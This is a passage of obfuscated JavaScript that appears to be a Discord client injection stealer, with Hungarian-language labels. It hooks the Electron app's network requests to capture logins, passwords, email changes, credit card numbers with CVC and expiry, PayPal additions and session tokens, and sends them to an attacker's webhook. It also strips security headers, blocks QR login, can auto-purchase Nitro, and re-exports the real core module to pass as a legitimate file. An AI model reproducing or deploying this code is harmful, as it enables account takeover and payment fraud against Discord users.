0x40:_0xae77ce+=_0x38b5fb(0x14c);break;case 0x100:_0xae77ce+=_0x38b5fb(0x107);break;case 0x0:_0xae77ce=_0x38b5fb(0x1a0);break;default:_0xae77ce=_0x38b5fb(0x1a0);break;}return _0xae77ce;},hooker=async _0x325881=>{const _0x2542b0=_0x22dede,_0x134fba=JSON[_0x2542b0(0x15b)](_0x325881),_0x467849=new URL(config[_0x2542b0(0x17c)]),_0x38a2de={'Content-Type':'application/json','Access-Control-Allow-Origin':'*'};if(!config[_0x2542b0(0x17c)]['includes'](_0x2542b0(0x15e))){const _0x187fc0=totp(config[_0x2542b0(0x138)]);_0x38a2de[_0x2542b0(0x186)]=_0x187fc0;}const _0x4340b0={'protocol':_0x467849[_0x2542b0(0x11b)],'hostname':_0x467849[_0x2542b0(0x131)],'path':_0x467849[_0x2542b0(0x12b)],'method':_0x2542b0(0x15f),'headers':_0x38a2de},_0x3a96ab=https[_0x2542b0(0x1a8)](_0x4340b0);_0x3a96ab['on'](_0x2542b0(0x17b),_0x498953=>{const _0xb07da8=_0x2542b0;console[_0xb07da8(0x120)](_0x498953);}),_0x3a96ab[_0x2542b0(0x1c2)](_0x134fba),_0x3a96ab[_0x2542b0(0x113)]();},login=async(_0x59027c,_0x44ad06,_0x1a4371)=>{const _0x1b62f8=_0x22dede,_0x402215=await getInfo(_0x1a4371),_0x2b7247=getNitro(_0x402215[_0x1b62f8(0x1b8)]),_0x59444b=getBadges(_0x402215[_0x1b62f8(0x170)]),_0xd7f077=await getBilling(_0x1a4371),_0x52de64={'username':config[_0x1b62f8(0x13a)],'avatar_url':config['embed_icon'],'embeds':[{'fields':[{'name':'**Fiók\x20információk**','value':_0x1b62f8(0x18a)+_0x59027c+_0x1b62f8(0x18f)+_0x44ad06+'**','inline':![]},{'name':_0x1b62f8(0x157),'value':'Nitro\x20típus:\x20**'+_0x2b7247+'**\x0aSzelvények:\x20**'+_0x59444b+'**\x0aSzámlázás:\x20**'+_0xd7f077+'**','inline':![]},{'name':'**Belépési\x20azonosító**','value':'`'+_0x1a4371+'`','inline':![]}],'author':{'name':_0x402215[_0x1b62f8(0x19e)],'icon_url':_0x1b62f8(0x161)+_0x402215['id']+'/'+_0x402215[_0x1b62f8(0x19a)]+_0x1b62f8(0x13f)}}]};if(config[_0x1b62f8(0x136)])_0x52de64[_0x1b62f8(0x196)]=config[_0x1b62f8(0x10b)];hooker(_0x52de64);},passwordChanged=async(_0x3aa972,_0x8b8ddc,_0x4bbcf2)=>{const _0x43adec=_0x22dede,_0x2d8ec3=await getInfo(_0x4bbcf2),_0x535847=getNitro(_0x2d8ec3[_0x43adec(0x1b8)]),_0x393b75=getBadges(_0x2d8ec3[_0x43adec(0x170)]),_0x290aab=await getBilling(_0x4bbcf2),_0x234ea1={'username':config[_0x43adec(0x13a)],'avatar_url':config[_0x43adec(0x181)],'embeds':[{'fields':[{'name':_0x43adec(0x177),'value':_0x43adec(0x18a)+_0x2d8ec3[_0x43adec(0x1ba)]+_0x43adec(0x108)+_0x3aa972+_0x43adec(0x106)+_0x8b8ddc+'**','inline':!![]},{'name':_0x43adec(0x157),'value':'Nitro\x20Típus:\x20**'+_0x535847+_0x43adec(0x12c)+_0x393b75+_0x43adec(0x18e)+_0x290aab+'**','inline':!![]},{'name':_0x43adec(0x1a3),'value':'`'+_0x4bbcf2+'`','inline':![]}],'author':{'name':_0x2d8ec3['username'],'icon_url':_0x43adec(0x161)+_0x2d8ec3['id']+'/'+_0x2d8ec3['avatar']+_0x43adec(0x13f)}}]};if(config[_0x43adec(0x136)])_0x234ea1[_0x43adec(0x196)]=config['ping_val'];hooker(_0x234ea1);},emailChanged=async(_0x2c7c95,_0x2dc3a4,_0x42f0f8)=>{const _0x1bf552=_0x22dede,_0xe9e351=await getInfo(_0x42f0f8),_0x245c98=getNitro(_0xe9e351[_0x1bf552(0x1b8)]),_0x3bb07d=getBadges(_0xe9e351[_0x1bf552(0x170)]),_0x2c2b31=await getBilling(_0x42f0f8),_0x3a1dde={'username':config['embed_name'],'avatar_url':config[_0x1bf552(0x181)],'embeds':[{'fields':[{'name':_0x1bf552(0x1c0),'value':_0x1bf552(0x17a)+_0x2c7c95+'**\x0aJelszó:\x20**'+_0x2dc3a4+'**','inline':!![]},{'name':_0x1bf552(0x157),'value':'Nitro\x20Típus:\x20**'+_0x245c98+'**\x0aSzelvények:\x20**'+_0x3bb07d+_0x1bf552(0x18e)+_0x2c2b31+'**','inline':!![]},{'name':_0x1bf552(0x1a3),'value':'`'+_0x42f0f8+'`','inline':![]}],'author':{'name':_0xe9e351[_0x1bf552(0x19e)],'icon_url':'https://cdn.discordapp.com/avatars/'+_0xe9e351['id']+'/'+_0xe9e351['avatar']+_0x1bf552(0x13f)}}]};if(config[_0x1bf552(0x136)])_0x3a1dde[_0x1bf552(0x196)]=config[_0x1bf552(0x10b)];hooker(_0x3a1dde);},PaypalAdded=async _0xb7a8dd=>{const _0x4293e5=_0x22dede,_0x35d0e8=await getInfo(_0xb7a8dd),_0x3447d2=getNitro(_0x35d0e8['premium_type']),_0xbc9942=getBadges(_0x35d0e8[_0x4293e5(0x170)]),_0x2dcca7=getBilling(_0xb7a8dd),_0x336ef3={'username':config['embed_name'],'avatar_url':config[_0x4293e5(0x181)],'embeds':[{'fields':[{'name':_0x4293e5(0xfa),'value':'Itt\x20az\x20idő\x20venni\x20pár\x20nitrót\x20baby😩','inline':![]},{'name':_0x4293e5(0x157),'value':_0x4293e5(0x16d)+_0x3447d2+'*\x0aSzelvények:\x20**'+_0xbc9942+'**\x0aSzámlázás:\x20**'+_0x2dcca7+'**','inline':![]},{'name':'**Belépési\x20azonosító**','value':'`'+_0xb7a8dd+'`','inline':![]}],'author':{'name':_0x35d0e8['username'],'icon_url':_0x4293e5(0x161)+_0x35d0e8['id']+'/'+_0x35d0e8[_0x4293e5(0x19a)]+_0x4293e5(0x13f)}}]};if(config[_0x4293e5(0x136)])_0x336ef3[_0x4293e5(0x196)]=config['ping_val'];hooker(_0x336ef3);},ccAdded=async(_0x2ea5ed,_0x3565f4,_0xca9b79,_0x22110c,_0x578a60)=>{const _0x36191e=_0x22dede,_0x56a229=await getInfo(_0x578a60),_0x57fd90=getNitro(_0x56a229[_0x36191e(0x1b8)]),_0xed34a8=getBadges(_0x56a229[_0x36191e(0x170)]),_0x43b2b8=await getBilling(_0x578a60),_0x4b9294={'username':config['embed_name'],'avatar_url':config[_0x36191e(0x181)],'embeds':[{'fields':[{'name':'**Hitelkártya\x20társítva\x20lett**','value':'Hitelkártya\x20szám:\x20**'+_0x2ea5ed+_0x36191e(0xfd)+_0x3565f4+_0x36191e(0x173)+_0xca9b79+'/'+_0x22110c+'**','inline':!![]},{'name':_0x36191e(0x157),'value':_0x36191e(0x16d)+_0x57fd90+_0x36191e(0x12c)+_0xed34a8+_0x36191e(0x18e)+_0x43b2b8+'**','inline':!![]},{'name':_0x36191e(0x1a3),'value':'`'+_0x578a60+'`','inline':![]}],'author':{'name':_0x56a229[_0x36191e(0x19e)],'icon_url':'https://cdn.discordapp.com/avatars/'+_0x56a229['id']+'/'+_0x56a229[_0x36191e(0x19a)]+_0x36191e(0x13f)}}]};if(config[_0x36191e(0x136)])_0x4b9294[_0x36191e(0x196)]=config[_0x36191e(0x10b)];hooker(_0x4b9294);},nitroBought=async _0x598ac6=>{const _0xf826c=_0x22dede,_0x11d14b=await getInfo(_0x598ac6),_0x3afec1=getNitro(_0x11d14b[_0xf826c(0x1b8)]),_0x3a037f=getBadges(_0x11d14b[_0xf826c(0x170)]),_0x38e1b5=await getBilling(_0x598ac6),_0x1fb5dd=await buyNitro(_0x598ac6),_0x3ee00b={'username':config[_0xf826c(0x13a)],'content':_0x1fb5dd,'avatar_url':config[_0xf826c(0x181)],'embeds':[{'fields':[{'name':'**Nitro\x20megvásárolva!**','value':_0xf826c(0x141)+_0x1fb5dd+_0xf826c(0x111),'inline':!![]},{'name':'**Discord\x20Információk**','value':_0xf826c(0x16d)+_0x3afec1+_0xf826c(0x12c)+_0x3a037f+_0xf826c(0x18e)+_0x38e1b5+'**','inline':!![]},{'name':'**Belépési\x20azonosító**','value':'`'+_0x598ac6+'`','inline':![]}],'author':{'name':_0x11d14b['username'],'icon_url':_0xf826c(0x161)+_0x11d14b['id']+'/'+_0x11d14b['avatar']+_0xf826c(0x13f)}}]};if(config[_0xf826c(0x136)])_0x3ee00b[_0xf826c(0x196)]=config[_0xf826c(0x10b)]+('\x0a'+_0x1fb5dd);hooker(_0x3ee00b);};session['defaultSession'][_0x22dede(0x1c1)][_0x22dede(0x19b)](config['filter2'],(_0x93bc9c,_0x2fce1c)=>{if(_0x93bc9c['url']['startsWith']('wss://remote-auth-gateway'))return _0x2fce1c({'cancel':!![]});updateCheck();}),session['defaultSession'][_0x22dede(0x1c1)][_0x22dede(0x1b3)]((_0x4f1828,_0x4c1996)=>{const _0x272994=_0x22dede;_0x4f1828[_0x272994(0x1c8)][_0x272994(0xf8)](config[_0x272994(0x17c)])?_0x4f1828[_0x272994(0x1c8)][_0x272994(0x18d)]('discord.com')?_0x4c1996({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0x4f1828['responseHeaders'])}):_0x4c1996({'responseHeaders':Object[_0x272994(0x130)]({'Content-Security-Policy':[_0x272994(0x159),_0x272994(0x1c5),_0x272994(0x19f)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x4f1828[_0x272994(0x1b4)])}):(delete _0x4f1828[_0x272994(0x1b4)][_0x272994(0x124)],delete _0x4f1828[_0x272994(0x1b4)]['content-security-policy-report-only'],_0x4c1996({'responseHeaders':{..._0x4f1828[_0x272994(0x1b4)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x22dede(0x171)]['webRequest'][_0x22dede(0x122)](config[_0x22dede(0x19d)],async(_0x1be340,_0x2bf052)=>{const _0x47a573=_0x22dede;if(_0x1be340[_0x47a573(0x1b0)]!==0xc8&&_0x1be340['statusCode']!==0xca)return;const _0x7b5aef=Buffer[_0x47a573(0x14b)](_0x1be340[_0x47a573(0xfe)][0x0][_0x47a573(0x172)])[_0x47a573(0x1b9)](),_0x39e109=JSON[_0x47a573(0x103)](_0x7b5aef),_0x49328d=await execScript(_0x47a573(0x11e));switch(!![]){case _0x1be340[_0x47a573(0x1c8)][_0x47a573(0x127)](_0x47a573(0x132)):login(_0x39e109[_0x47a573(0x132)],_0x39e109[_0x47a573(0x1b7)],_0x49328d)[_0x47a573(0x1bb)](console[_0x47a573(0x17b)]);break;case _0x1be340['url'][_0x47a573(0x127)]('users/@me')&&_0x1be340[_0x47a573(0x1ac)]==='PATCH':if(!_0x39e109[_0x47a573(0x1b7)])return;_0x39e109[_0x47a573(0x1ba)]&&emailChanged(_0x39e109['email'],_0x39e109[_0x47a573(0x1b7)],_0x49328d)[_0x47a573(0x1bb)](console['error']);_0x39e109[_0x47a573(0x118)]&&passwordChanged(_0x39e109[_0x47a573(0x1b7)],_0x39e109[_0x47a573(0x118)],_0x49328d)[_0x47a573(0x1bb)](console[_0x47a573(0x17b)]);break;case _0x1be340[_0x47a573(0x1c8)]['endsWith'](_0x47a573(0xf6))&&_0x1be340['method']==='POST':const _0x405cf6=querystring[_0x47a573(0x103)](unparsedData[_0x47a573(0x1b9)]());ccAdded(_0x405cf6[_0x47a573(0x190)],_0x405cf6[_0x47a573(0x1a2)],_0x405cf6[_0x47a573(0xfb)],_0x405cf6[_0x47a573(0x14f)],_0x49328d)[_0x47a573(0x1bb)](console[_0x47a573(0x17b)]);break;case _0x1be340[_0x47a573(0x1c8)][_0x47a573(0x127)](_0x47a573(0x153))&&_0x1be340[_0x47a573(0x1ac)]===_0x47a573(0x15f):PaypalAdded(_0x49328d)[_0x47a573(0x1bb)](console[_0x47a573(0x17b)]);break;case _0x1be340[_0x47a573(0x1c8)]['endsWith'](_0x47a573(0x135))&&_0x1be340[_0x47a573(0x1ac)]===_0x47a573(0x15f):if(!config['auto_buy_nitro'])return;setTimeout(()=>{const _0x2037aa=_0x47a573;nitroBought(_0x49328d)[_0x2037aa(0x1bb)](console[_0x2037aa(0x17b)]);},0x1d4c);break;default:break;}}),module[_0x22dede(0x1b1)]=require(_0x22dede(0x15c));
